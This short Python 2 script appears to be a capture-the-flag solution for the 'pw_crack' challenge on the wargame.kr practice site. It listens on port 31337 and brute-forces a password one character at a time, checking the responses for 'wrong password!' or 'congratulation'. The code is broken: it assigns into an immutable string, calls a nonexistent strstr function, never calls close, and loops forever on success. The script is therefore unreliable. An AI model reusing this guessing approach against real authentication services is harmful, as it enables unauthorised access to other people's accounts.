import requests
from socket import *

s = socket(AF_INET, SOCK_STREAM, 0)

s.bind(('', 31337))
s.listen(1)

data=""
data_idx = 0

while True:
	requests.get("http://wargame.kr:8080/pw_crack/check.php")

	print "waiting for connection"
	client, addr = s.accept()
	print "connected from " + str(addr)
	res = client.recv(100)          	# client's message
	print res

	i = 0
	while True:
		if i > 127:			# 아스키코드 범위 초과 시 break
			print "error"
			exit()

		i = i + 1
		data[data_idx] = chr(i)
		client.send(data)
		res = client.recv(100)
		print data + " : " + res

		if strstr(res, "wrong password!") != -1:
			data_idx = data_idx + 1
			break
		elif strstr(res, "congratulation") != -1:
			while True:
				print "pw : " + data
	client.close()
	print "==================================="
s.close
